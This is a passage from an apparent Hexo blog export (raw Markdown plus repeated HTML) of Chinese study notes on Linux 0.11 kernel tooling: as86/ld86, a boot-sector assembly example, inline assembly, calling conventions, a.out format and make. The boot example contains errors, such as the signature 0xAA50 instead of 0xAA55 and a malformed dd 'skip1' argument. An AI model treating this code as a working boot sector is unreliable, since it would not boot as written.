!类似于C语言宏定义,EQU,Intel内存代码执行首地址\nentry start        !告知链接程序,程序从start标号开始执行\nstart:\njmpi\tgo, BOOTSEG !段间跳转,两个地址,低地址16位送IP寄存器,高地址16位送cs段寄存器\ngo:\n\t\tmov\tax, cs  !将cs段寄存器值同步至ds,es,此代码未用到ss\n\t\tmov es, ax\n\t\tmov ds, ax\n\t\tmov [msg1+17], ah   !示例修改串,然后会调用BIOS中断,参考链接https://zh.wikipedia.org/wiki/INT_10\n\t\tmov\tcx, #20  \t\t!立即数需要前缀#,根据BIOS提供的接口约定,cx为字符总个数\n\t\tmov\tdx, #0x1004  \t!约定,位置,此时为17行5列\n\t\tmov bx, #0x000c    \t!约定,字符属性(红色)\n\t\tmov bp, #msg1\t\t!约定,字符缓冲区首地址\n\t\tmov ax, #0x1301\t\t!ah=0x13表示写字符串功能号\n\t\tint 0x10\t\t\t!调用BIOS中断\nloop1:  jmp \tloop1  \t\t!死循环待机\nmsg1:\t.ascii\t\"Loading system...\" !字符20个,包括回车换行\n\t\t.byte \t13,10\n.org\t510\t\t\t\t\t!表示以后的语句从偏移地址510开始放\n\t\t.word \t0xAA50\t\t!有效引导扇区标志,约定\n.text\nendtext:\n.data\nenddata:\n.bss\nendbss:\n\n```\n - 可参照如下命令进行编译链接等\n ![Linux_0.11_chapter3_as86_compile.png](/images/Linux_0.11_chapter3_as86_compile.png)\n - 本应该512字节的boot程序(MBR)多出32字节为MINIX可执行文件头结构,需剔除掉(dd命令等).而后可用Bochs等模拟器观察现象,正常如下:\n ![Linux_0.11_chapter3_as86_boot.png.png](/images/Linux_0.11_chapter3_as86_boot.png.png)\n- **as86具体使用方法:**\n![Linux_0.11_chapter3_as86.png](/images/Linux_0.11_chapter3_as86.png)\n- **ld86具体使用方法:**\n![Linux_0.11_chapter3_ld86.png](/images/Linux_0.11_chapter3_ld86.png)\n\n# GNU as汇编\n- 内核中其余所有汇编语言程序(包括C语言产生的汇编程序)均由gas来编译,并与C语言程序编译产生的模块进行链接. \n- **Intel格式的汇编与AT&T格式的汇编区别:**\n![Linux_0.11_chapter3_Intel_AT&T_diff.png](/images/Linux_0.11_chapter3_Intel_AT&T_diff.png)\n- as汇编器对汇编语言程序只进行简单地预处理,比如调整并删除多余空格和制表符,删除注释等;如需要进行宏替换则可以让汇编语言程序使用大写后缀'.S'来让as使用gcc的CPP预处理功能.\n- 具体关于汇编指令部分可以参考Intel开发者手册\n## 区和重定位\n - 区:有时候也成为段,节或部分,英文为section,用来表示一个地址范围,操作系统将会以相同的方式对待和处理改地址范围的数据信息.\n - 重定位:当汇编过后的数据中出现重定位节时候,由链接器负责修正重定位的数据部分(至于为什么会需要重定位这与很多机制有关系了,必须虚拟内存等).\n## 链接器涉及的区:\n ![Linux_0.11_chapter3_linker_section.png](/images/Linux_0.11_chapter3_linker_section.png)\n- 关于gcc对于C程序的编译和链接过程可参考[前文](http://www.rutk1t0r.org/2016/09/06/C%E8%AF%AD%E8%A8%80%E5%AE%8F%E5%AE%9A%E4%B9%89%E5%B0%8F%E8%AF%95/)\n## 嵌入汇编\n - 格式：\n\t```asm\n\tasm(\"汇编语句\"\n\t\t:输出寄存器\n\t\t:输入寄存器\n\t\t:会被修改的寄存器);\n\t```\n - 嵌入汇编的好处就是利用gcc的灵活性在C语言里面精练地实现某些特定功能\n - Linux内核源码中仍然在使用圆括号的组合语句，一般用在宏定义。\n - strcpy的嵌入汇编实现如下，因为首先要进行预处理，所以增加换行便于浏览。\n\t```C\n\t//将字符串(src)拷贝到另一字符串(dest)，直到遇到NULL字符后终止\n\t//参数:dest - 目的字符串指针, src - 源字符串指针, %0 - esi(src), %1 - edi(dest)。\n\textern inline char *strcpy(char *dest, const char *src)\n\t{\n\t__asm__(\"cld\\n\"\t\t\t//清空方向标志，往上为默认增长\n\t\t\t\"1:\\tlodsb\\n\\t\" //加载DS:[esi]处1字节->al,esi++\n\t\t\t\"stosb\\n\\t\"\t\t//存储al->ES:[edi],edi++\n\t\t\t\"testb %%al, %%al\\n\\t\"\t//测试刚刚存储是否为NULL字符\n\t\t\t\"jne 1b\"\t\t//不是则继续跳到标号1处，否则就结束\n\t\t\t::\"S\"(src), \"D\"(dest)\":\"si\",\"di\",\"ax\");\n\treturn dest;\t\t\t//返回目的字符串首地址，实现链式\n\t}\n\t```\n\n## C与汇编的相互调用\n- 调用约定(主要根据参数顺序、传参方式以及平衡堆栈者等来区分,当然其他体系结构也有其他实现,这里主要是IA-32体系,Intel 64调用约定已经开始大幅度使用寄存器传参)\n  - fastcall:Linux系统调用比较常用，直接利用寄存器传参，子程序(被调用者)清除栈帧\n  - __cdecl:参数从右至左压栈，由调用者负责清除栈空间，可变参数\n  - stdcall:Windows的Win32 API常用，与__cdecl区别是被调用者一般用类似`ret n`指令来清除栈空间(清除栈空间主要是恢复被保存的寄存器值以及栈指针回归)\n  - PASCAL:从左到右压栈，被调用者清栈\n  - this:C++标准的Microsoft实现利用ecx传递对象首地址\n- 在软件工程师的角度,以汇编语言作为\"车轮子\"和\"底线\"完全可以应付了绝大多数的问题了，因此只要源代码汇编过后保持一致性，各种语言之间的相互调用都是可以的。\n\n\n# Linux 0.11目标文件格式\n\n\n> 有关目标文件和链接程序的基本工作原理可参见John R.Levine著的《Linkers & Loaders》(有中文译版）一书。\n\n## a.out映像\n- 在Linux 0.11系统中，GNU gcc或者gas编译输出的目标模块文件和链接程序所生成的可执行文件都使用了UNIX传统的a.out格式。对于具有内存分页机制的系统(可由硬件芯片给予软件以支持）来说，这是一种简单有效的目标文件格式。\n![Linux_0.11_chapter3_a.out_map.png](/images/Linux_0.11_chapter3_a.out_map.png)\n![Linux_0.11_chapter3_a.out_map_header1.png](/images/Linux_0.11_chapter3_a.out_map_header1.png)\n![Linux_0.11_chapter3_a.out_map_header2.png](/images/Linux_0.11_chapter3_a.out_map_header2.png)\n- Linux内核可执行文件加载器将可执行文件从磁盘加载到内存中的映像\n![Linux_0.11_chapter3_a.out_map_to_memory.png](/images/Linux_0.11_chapter3_a.out_map_to_memory.png)\n- 链接程序的操作\n![Linux_0.11_chapter3_a.out_linkers.png](/images/Linux_0.11_chapter3_a.out_linkers.png)\n\n## 链接程序预定义变量\n- 在链接过程中，链接器ld和ld86会使用自身的变量记录下执行程序中每个段的逻辑地址。因此可以在程序用通过几个外部变量来获取程序中段的位置。\n - _etext(etext):它的地址是.text段结束后的第一个地址;\n - _edata(edata):它的地址是.data初始化数据区后的第一个地址;\n - _end(end):它的地址是未初始化数据区.bss后的第一个地址位置。\n - 带下划线前缀和不带是等价的，唯一的区别在ANSI、POSIX等标准中没有定义符号etext、edata和end。\n - Linux 0.1x 内核在初始化块设备高速缓存区时(fs/buffer.c)， 就使用了变量_end来获取内核映像文件Image在内存中的末端后的位置，并从这个位置起开始设置高速缓冲区。\n\n- 利用System.map文件可以找寻到**目标文件及符号信息映射到内存的位置**、**公共符号设置**、**链接中包含的所有文件成员以及其引用的符号**和**内核运行错误信息及调试**。\n - 目标文件符号列表文件中的符号类型\n ![Linux_0.11_chapter3_a.out_symbol1.png](/images/Linux_0.11_chapter3_a.out_symbol1.png)\n ![Linux_0.11_chapter3_a.out_symbol2.png](/images/Linux_0.11_chapter3_a.out_symbol2.png)\n\n# Make 和 Makefile\n- make程序通过Makefile文件知道如何编译和链接程序\n- make的执行过程为两个阶段。\n - 读取**所有的**Makefile文件以及包含的Makefile文件等，记录所有的变量及值、隐式的或显式的规则，并构造出所有目标对象及其先决条件的一幅全景图;\n - make就使用这些内部结构来确定哪个目标对象需要被重建，并且根据相应的规则来操作。\n- 当make重新编译程序的时，每个修改过的C代码文件(根据文件时间戳)必须被重新编译。如果头文件被修改过了，那么为了保证正确，make也会重新编译每个包含此头文件的C代码文件(因此某些声明最好放在头文件中，加快编译速度)。\n\n# 总结\n- 基本的开发环境需要搭建和理解\n- 汇编语言在Linux内核中的重要性\n- 目标文件格式基本格式需理解(PE更复杂)\n- 链接器的高级特效需理解\n- Makefile高级用法需要会用\n\n","slug":"Linux内核0-11完全注释-第三章","published":1,"updated":"2016-11-17T10:25:55.844Z","_id":"civm7od4800008wuaivloppwu","comments":1,"layout":"post","photos":[],"link":"","content":"<blockquote>\n<p>介绍Linux内核0.11版本的编程语言和环境以及目标文件格式等  </p>\n</blockquote>\n<hr>\n<h1 id=\"as86-和-ld86\"><a href=\"#as86-和-ld86\" class=\"headerlink\" title=\"as86 和 ld86\"></a>as86 和 ld86</h1><ul>\n<li><p>as86 在开发Linux内核时仅用来创建16位的启动引导扇区程序boot/boosect.s和实模式下的初始设置程序boot/setup.s的二进制执行代码.采用Intel格式的汇编指令格式.</p>\n<ul>\n<li>汇编的命令行基本格式:<code>as [选项] -o objfile srcfile</code>.</li>\n<li><code>=</code>或<code>EQU</code>符号等价于C语言的宏</li>\n<li><code>.</code>编译过程中的位置计数器,等价于<code>$</code></li>\n<li><code>:</code>符号,本质为汇编地址</li>\n<li>目标文件objfile起码包含三个section,<strong>.text</strong>,<strong>.data</strong>,<strong>.bss</strong></li>\n</ul>\n</li>\n<li><p>as86汇编语言程序例程:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div></pre></td><td class=\"code\"><pre><div class=\"line\">!</div><div class=\"line\">!Filename:boot.s</div><div class=\"line\">!</div><div class=\"line\">!Description: boot section codes on Intel CPU</div><div class=\"line\">!</div><div class=\"line\">!Author:rutk1t0r</div><div class=\"line\">!</div><div class=\"line\">!Data:2016.11.8</div><div class=\"line\">!</div><div class=\"line\">!GPL</div><div class=\"line\">!</div><div class=\"line\">!method:</div><div class=\"line\">![/root]# as86 -0 -a -o boot.o boot.s    #编译</div><div class=\"line\">![/root]# ld86 -0 -s -o boot boot.o      #链接</div><div class=\"line\">![/root]# dd bs=32 if=boot of=/dev/fd0 skip1   #写入软盘或者image文件</div><div class=\"line\">!==================================================================</div><div class=\"line\">!</div><div class=\"line\">!</div><div class=\"line\">! boot.s -- bootsect.s 的框架程序.用代码0x07替换字符串msg1中一个字符,然后在屏幕上1行显示</div><div class=\"line\">!</div><div class=\"line\">.globl begtext, begdata, begbss, endtext, enddata, endbss !全局标识符,供ld86链接使用</div><div class=\"line\">.text  !代码段</div><div class=\"line\">begtext:</div><div class=\"line\">.data</div><div class=\"line\">begdata:</div><div class=\"line\">.bss</div><div class=\"line\">begbss:</div><div class=\"line\">.text</div><div class=\"line\">BOOTSEG = 0x07c0   !类似于C语言宏定义,EQU,Intel内存代码执行首地址</div><div class=\"line\">entry start        !告知链接程序,程序从start标号开始执行</div><div class=\"line\">start:</div><div class=\"line\">jmpi\tgo, BOOTSEG !段间跳转,两个地址,低地址16位送IP寄存器,高地址16位送cs段寄存器</div><div class=\"line\">go:</div><div class=\"line\">\t\tmov\tax, cs  !将cs段寄存器值同步至ds,es,此代码未用到ss</div><div class=\"line\">\t\tmov es, ax</div><div class=\"line\">\t\tmov ds, ax</div><div class=\"line\">\t\tmov [msg1+17], ah   !示例修改串,然后会调用BIOS中断,参考链接https://zh.wikipedia.org/wiki/INT_10</div><div class=\"line\">\t\tmov\tcx, #20  \t\t!立即数需要前缀#,根据BIOS提供的接口约定,cx为字符总个数</div><div class=\"line\">\t\tmov\tdx, #0x1004  \t!约定,位置,此时为17行5列</div><div class=\"line\">\t\tmov bx, #0x000c    \t!约定,字符属性(红色)</div><div class=\"line\">\t\tmov bp, #msg1\t\t!约定,字符缓冲区首地址</div><div class=\"line\">\t\tmov ax, #0x1301\t\t!ah=0x13表示写字符串功能号</div><div class=\"line\">\t\tint 0x10\t\t\t!调用BIOS中断</div><div class=\"line\">loop1:  jmp \tloop1  \t\t!死循环待机</div><div class=\"line\">msg1:\t.ascii\t&quot;Loading system...&quot; !字符20个,包括回车换行</div><div class=\"line\">\t\t.byte \t13,10</div><div class=\"line\">.org\t510\t\t\t\t\t!表示以后的语句从偏移地址510开始放</div><div class=\"line\">\t\t.word \t0xAA50\t\t!有效引导扇区标志,约定</div><div class=\"line\">.text</div><div class=\"line\">endtext:</div><div class=\"line\">.data</div><div class=\"line\">enddata:</div><div class=\"line\">.bss</div><div class=\"line\">endbss:</div></pre></td></tr></table></figure>\n<ul>\n<li>可参照如下命令进行编译链接等<br><img src=\"/images/Linux_0.11_chapter3_as86_compile.png\" alt=\"Linux_0.11_chapter3_as86_compile.png\"></li>\n<li>本应该512字节的boot程序(MBR)多出32字节为MINIX可执行文件头结构,需剔除掉(dd命令等).而后可用Bochs等模拟器观察现象,正常如下:<br><img src=\"/images/Linux_0.11_chapter3_as86_boot.png.png\" alt=\"Linux_0.11_chapter3_as86_boot.png.png\"></li>\n</ul>\n</li>\n<li><strong>as86具体使用方法:</strong><br><img src=\"/images/Linux_0.11_chapter3_as86.png\" alt=\"Linux_0.11_chapter3_as86.png\"></li>\n<li><strong>ld86具体使用方法:</strong><br><img src=\"/images/Linux_0.11_chapter3_ld86.png\" alt=\"Linux_0.11_chapter3_ld86.png\"></li>\n</ul>\n<h1 id=\"GNU-as汇编\"><a href=\"#GNU-as汇编\" class=\"headerlink\" title=\"GNU as汇编\"></a>GNU as汇编</h1><ul>\n<li>内核中其余所有汇编语言程序(包括C语言产生的汇编程序)均由gas来编译,并与C语言程序编译产生的模块进行链接. </li>\n<li><strong>Intel格式的汇编与AT&amp;T格式的汇编区别:</strong><br><img src=\"/images/Linux_0.11_chapter3_Intel_AT&amp;T_diff.png\" alt=\"Linux_0.11_chapter3_Intel_AT&amp;T_diff.png\"></li>\n<li>as汇编器对汇编语言程序只进行简单地预处理,比如调整并删除多余空格和制表符,删除注释等;如需要进行宏替换则可以让汇编语言程序使用大写后缀’.S’来让as使用gcc的CPP预处理功能.</li>\n<li>具体关于汇编指令部分可以参考Intel开发者手册<h2 id=\"区和重定位\"><a href=\"#区和重定位\" class=\"headerlink\" title=\"区和重定位\"></a>区和重定位</h2><ul>\n<li>区:有时候也成为段,节或部分,英文为section,用来表示一个地址范围,操作系统将会以相同的方式对待和处理改地址范围的数据信息.</li>\n<li>重定位:当汇编过后的数据中出现重定位节时候,由链接器负责修正重定位的数据部分(至于为什么会需要重定位这与很多机制有关系了,必须虚拟内存等).<h2 id=\"链接器涉及的区\"><a href=\"#链接器涉及的区\" class=\"headerlink\" title=\"链接器涉及的区:\"></a>链接器涉及的区:</h2><img src=\"/images/Linux_0.11_chapter3_linker_section.png\" alt=\"Linux_0.11_chapter3_linker_section.png\"></li>\n</ul>\n</li>\n<li><p>关于gcc对于C程序的编译和链接过程可参考<a href=\"http://www.rutk1t0r.org/2016/09/06/C%E8%AF%AD%E8%A8%80%E5%AE%8F%E5%AE%9A%E4%B9%89%E5%B0%8F%E8%AF%95/\" target=\"_blank\" rel=\"external\">前文</a></p>\n<h2 id=\"嵌入汇编\"><a href=\"#嵌入汇编\" class=\"headerlink\" title=\"嵌入汇编\"></a>嵌入汇编</h2><ul>\n<li><p>格式：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">asm(&quot;汇编语句&quot;</div><div class=\"line\">\t:输出寄存器</div><div class=\"line\">\t:输入寄存器</div><div class=\"line\">\t:会被修改的寄存器);</div></pre></td></tr></table></figure>\n</li>\n<li><p>嵌入汇编的好处就是利用gcc的灵活性在C语言里面精练地实现某些特定功能</p>\n</li>\n<li>Linux内核源码中仍然在使用圆括号的组合语句，一般用在宏定义。</li>\n<li>strcpy的嵌入汇编实现如下，因为首先要进行预处理，所以增加换行便于浏览。<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div></pre></td><td class=\"code\"><pre><div class=\"line\">//将字符串(src)拷贝到另一字符串(dest)，直到遇到NULL字符后终止</div><div class=\"line\">//参数:dest - 目的字符串指针, src - 源字符串指针, %0 - esi(src), %1 - edi(dest)。</div><div class=\"line\">extern inline char *strcpy(char *dest, const char *src)</div><div class=\"line\">&#123;</div><div class=\"line\">__asm__(\"cld\\n\"\t\t\t//清空方向标志，往上为默认增长</div><div class=\"line\">\t\t\"1:\\tlodsb\\n\\t\" //加载DS:[esi]处1字节-&gt;al,esi++</div><div class=\"line\">\t\t\"stosb\\n\\t\"\t\t//存储al-&gt;ES:[edi],edi++</div><div class=\"line\">\t\t\"testb %%al, %%al\\n\\t\"\t//测试刚刚存储是否为NULL字符</div><div class=\"line\">\t\t\"jne 1b\"\t\t//不是则继续跳到标号1处，否则就结束</div><div class=\"line\">\t\t::\"S\"(src), \"D\"(dest)\":\"si\",\"di\",\"ax\");</div><div class=\"line\">return dest;\t\t\t//返回目的字符串首地址，实现链式</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"C与汇编的相互调用\"><a href=\"#C与汇编的相互调用\" class=\"headerlink\" title=\"C与汇编的相互调用\"></a>C与汇编的相互调用</h2><ul>\n<li>调用约定(主要根据参数顺序、传参方式以及平衡堆栈者等来区分,当然其他体系结构也有其他实现,这里主要是IA-32体系,Intel 64调用约定已经开始大幅度使用寄存器传参)<ul>\n<li>fastcall:Linux系统调用比较常用，直接利用寄存器传参，子程序(被调用者)清除栈帧</li>\n<li>__cdecl:参数从右至左压栈，由调用者负责清除栈空间，可变参数</li>\n<li>stdcall:Windows的Win32 API常用，与__cdecl区别是被调用者一般用类似<code>ret n</code>指令来清除栈空间(清除栈空间主要是恢复被保存的寄存器值以及栈指针回归)</li>\n<li>PASCAL:从左到右压栈，被调用者清栈</li>\n<li>this:C++标准的Microsoft实现利用ecx传递对象首地址</li>\n</ul>\n</li>\n<li>在软件工程师的角度,以汇编语言作为”车轮子”和”底线”完全可以应付了绝大多数的问题了，因此只要源代码汇编过后保持一致性，各种语言之间的相互调用都是可以的。</li>\n</ul>\n<h1 id=\"Linux-0-11目标文件格式\"><a href=\"#Linux-0-11目标文件格式\" class=\"headerlink\" title=\"Linux 0.11目标文件格式\"></a>Linux 0.11目标文件格式</h1><blockquote>\n<p>有关目标文件和链接程序的基本工作原理可参见John R.Levine著的《Linkers &amp; Loaders》(有中文译版）一书。</p>\n</blockquote>\n<h2 id=\"a-out映像\"><a href=\"#a-out映像\" class=\"headerlink\" title=\"a.out映像\"></a>a.out映像</h2><ul>\n<li>在Linux 0.11系统中，GNU gcc或者gas编译输出的目标模块文件和链接程序所生成的可执行文件都使用了UNIX传统的a.out格式。对于具有内存分页机制的系统(可由硬件芯片给予软件以支持）来说，这是一种简单有效的目标文件格式。<br><img src=\"/images/Linux_0.11_chapter3_a.out_map.png\" alt=\"Linux_0.11_chapter3_a.out_map.png\"><br><img src=\"/images/Linux_0.11_chapter3_a.out_map_header1.png\" alt=\"Linux_0.11_chapter3_a.out_map_header1.png\"><br><img src=\"/images/Linux_0.11_chapter3_a.out_map_header2.png\" alt=\"Linux_0.11_chapter3_a.out_map_header2.png\"></li>\n<li>Linux内核可执行文件加载器将可执行文件从磁盘加载到内存中的映像<br><img src=\"/images/Linux_0.11_chapter3_a.out_map_to_memory.png\" alt=\"Linux_0.11_chapter3_a.out_map_to_memory.png\"></li>\n<li>链接程序的操作<br><img src=\"/images/Linux_0.11_chapter3_a.out_linkers.png\" alt=\"Linux_0.11_chapter3_a.out_linkers.png\"></li>\n</ul>\n<h2 id=\"链接程序预定义变量\"><a href=\"#链接程序预定义变量\" class=\"headerlink\" title=\"链接程序预定义变量\"></a>链接程序预定义变量</h2><ul>\n<li><p>在链接过程中，链接器ld和ld86会使用自身的变量记录下执行程序中每个段的逻辑地址。因此可以在程序用通过几个外部变量来获取程序中段的位置。</p>\n<ul>\n<li>_etext(etext):它的地址是.text段结束后的第一个地址;</li>\n<li>_edata(edata):它的地址是.data初始化数据区后的第一个地址;</li>\n<li>_end(end):它的地址是未初始化数据区.bss后的第一个地址位置。</li>\n<li>带下划线前缀和不带是等价的，唯一的区别在ANSI、POSIX等标准中没有定义符号etext、edata和end。</li>\n<li>Linux 0.1x 内核在初始化块设备高速缓存区时(fs/buffer.c)， 就使用了变量_end来获取内核映像文件Image在内存中的末端后的位置，并从这个位置起开始设置高速缓冲区。</li>\n</ul>\n</li>\n<li><p>利用System.map文件可以找寻到<strong>目标文件及符号信息映射到内存的位置</strong>、<strong>公共符号设置</strong>、<strong>链接中包含的所有文件成员以及其引用的符号</strong>和<strong>内核运行错误信息及调试</strong>。</p>\n<ul>\n<li>目标文件符号列表文件中的符号类型<br><img src=\"/images/Linux_0.11_chapter3_a.out_symbol1.png\" alt=\"Linux_0.11_chapter3_a.out_symbol1.png\"><br><img src=\"/images/Linux_0.11_chapter3_a.out_symbol2.png\" alt=\"Linux_0.11_chapter3_a.out_symbol2.png\"></li>\n</ul>\n</li>\n</ul>\n<h1 id=\"Make-和-Makefile\"><a href=\"#Make-和-Makefile\" class=\"headerlink\" title=\"Make 和 Makefile\"></a>Make 和 Makefile</h1><ul>\n<li>make程序通过Makefile文件知道如何编译和链接程序</li>\n<li>make的执行过程为两个阶段。<ul>\n<li>读取<strong>所有的</strong>Makefile文件以及包含的Makefile文件等，记录所有的变量及值、隐式的或显式的规则，并构造出所有目标对象及其先决条件的一幅全景图;</li>\n<li>make就使用这些内部结构来确定哪个目标对象需要被重建，并且根据相应的规则来操作。</li>\n</ul>\n</li>\n<li>当make重新编译程序的时，每个修改过的C代码文件(根据文件时间戳)必须被重新编译。如果头文件被修改过了，那么为了保证正确，make也会重新编译每个包含此头文件的C代码文件(因此某些声明最好放在头文件中，加快编译速度)。</li>\n</ul>\n<h1 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h1><ul>\n<li>基本的开发环境需要搭建和理解</li>\n<li>汇编语言在Linux内核中的重要性</li>\n<li>目标文件格式基本格式需理解(PE更复杂)</li>\n<li>链接器的高级特效需理解</li>\n<li>Makefile高级用法需要会用</li>\n</ul>\n","excerpt":"","more":"<blockquote>\n<p>介绍Linux内核0.11版本的编程语言和环境以及目标文件格式等  </p>\n</blockquote>\n<hr>\n<h1 id=\"as86-和-ld86\"><a href=\"#as86-和-ld86\" class=\"headerlink\" title=\"as86 和 ld86\"></a>as86 和 ld86</h1><ul>\n<li><p>as86 在开发Linux内核时仅用来创建16位的启动引导扇区程序boot/boosect.s和实模式下的初始设置程序boot/setup.s的二进制执行代码.采用Intel格式的汇编指令格式.</p>\n<ul>\n<li>汇编的命令行基本格式:<code>as [选项] -o objfile srcfile</code>.</li>\n<li><code>=</code>或<code>EQU</code>符号等价于C语言的宏</li>\n<li><code>.</code>编译过程中的位置计数器,等价于<code>$</code></li>\n<li><code>:</code>符号,本质为汇编地址</li>\n<li>目标文件objfile起码包含三个section,<strong>.text</strong>,<strong>.data</strong>,<strong>.bss</strong></li>\n</ul>\n</li>\n<li><p>as86汇编语言程序例程:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div></pre></td><td class=\"code\"><pre><div class=\"line\">!</div><div class=\"line\">!Filename:boot.s</div><div class=\"line\">!</div><div class=\"line\">!Description: boot section codes on Intel CPU</div><div class=\"line\">!</div><div class=\"line\">!Author:rutk1t0r</div><div class=\"line\">!</div><div class=\"line\">!Data:2016.11.8</div><div class=\"line\">!</div><div class=\"line\">!GPL</div><div class=\"line\">!</div><div class=\"line\">!method:</div><div class=\"line\">![/root]# as86 -0 -a -o boot.o boot.s    #编译</div><div class=\"line\">![/root]# ld86 -0 -s -o boot boot.o      #链接</div><div class=\"line\">![/root]# dd bs=32 if=boot of=/dev/fd0 skip1   #写入软盘或者image文件</div><div class=\"line\">!==================================================================</div><div class=\"line\">!</div><div class=\"line\">!</div><div class=\"line\">! boot.s -- bootsect.s 的框架程序.用代码0x07替换字符串msg1中一个字符,然后在屏幕上1行显示</div><div class=\"line\">!</div><div class=\"line\">.globl begtext, begdata, begbss, endtext, enddata, endbss !全局标识符,供ld86链接使用</div><div class=\"line\">.text  !代码段</div><div class=\"line\">begtext:</div><div class=\"line\">.data</div><div class=\"line\">begdata:</div><div class=\"line\">.bss</div><div class=\"line\">begbss:</div><div class=\"line\">.text</div><div class=\"line\">BOOTSEG = 0x07c0   !类似于C语言宏定义,EQU,Intel内存代码执行首地址</div><div class=\"line\">entry start        !告知链接程序,程序从start标号开始执行</div><div class=\"line\">start:</div><div class=\"line\">jmpi\tgo, BOOTSEG !段间跳转,两个地址,低地址16位送IP寄存器,高地址16位送cs段寄存器</div><div class=\"line\">go:</div><div class=\"line\">\t\tmov\tax, cs  !将cs段寄存器值同步至ds,es,此代码未用到ss</div><div class=\"line\">\t\tmov es, ax</div><div class=\"line\">\t\tmov ds, ax</div><div class=\"line\">\t\tmov [msg1+17], ah   !示例修改串,然后会调用BIOS中断,参考链接https://zh.wikipedia.org/wiki/INT_10</div><div class=\"line\">\t\tmov\tcx, #20  \t\t!立即数需要前缀#,根据BIOS提供的接口约定,cx为字符总个数</div><div class=\"line\">\t\tmov\tdx, #0x1004  \t!约定,位置,此时为17行5列</div><div class=\"line\">\t\tmov bx, #0x000c    \t!约定,字符属性(红色)</div><div class=\"line\">\t\tmov bp, #msg1\t\t!约定,字符缓冲区首地址</div><div class=\"line\">\t\tmov ax, #0x1301\t\t!ah=0x13表示写字符串功能号</div><div class=\"line\">\t\tint 0x10\t\t\t!调用BIOS中断</div><div class=\"line\">loop1:  jmp \tloop1  \t\t!死循环待机</div><div class=\"line\">msg1:\t.ascii\t&quot;Loading system...&quot; !字符20个,包括回车换行</div><div class=\"line\">\t\t.byte \t13,10</div><div class=\"line\">.org\t510\t\t\t\t\t!表示以后的语句从偏移地址510开始放</div><div class=\"line\">\t\t.word \t0xAA50\t\t!有效引导扇区标志,约定</div><div class=\"line\">.text</div><div class=\"line\">endtext:</div><div class=\"line\">.data</div><div class=\"line\">enddata:</div><div class=\"line\">.bss</div><div class=\"line\">endbss:</div></pre></td></tr></table></figure>\n<ul>\n<li>可参照如下命令进行编译链接等<br><img src=\"/images/Linux_0.11_chapter3_as86_compile.png\" alt=\"Linux_0.11_chapter3_as86_compile.png\"></li>\n<li>本应该512字节的boot程序(MBR)多出32字节为MINIX可执行文件头结构,需剔除掉(dd命令等).而后可用Bochs等模拟器观察现象,正常如下:<br><img src=\"/images/Linux_0.11_chapter3_as86_boot.png.png\" alt=\"Linux_0.11_chapter3_as86_boot.png.png\"></li>\n</ul>\n</li>\n<li><strong>as86具体使用方法:</strong><br><img src=\"/images/Linux_0.11_chapter3_as86.png\" alt=\"Linux_0.11_chapter3_as86.png\"></li>\n<li><strong>ld86具体使用方法:</strong><br><img src=\"/images/Linux_0.11_chapter3_ld86.png\" alt=\"Linux_0.11_chapter3_ld86.png\"></li>\n</ul>\n<h1 id=\"GNU-as汇编\"><a href=\"#GNU-as汇编\" class=\"headerlink\" title=\"GNU as汇编\"></a>GNU 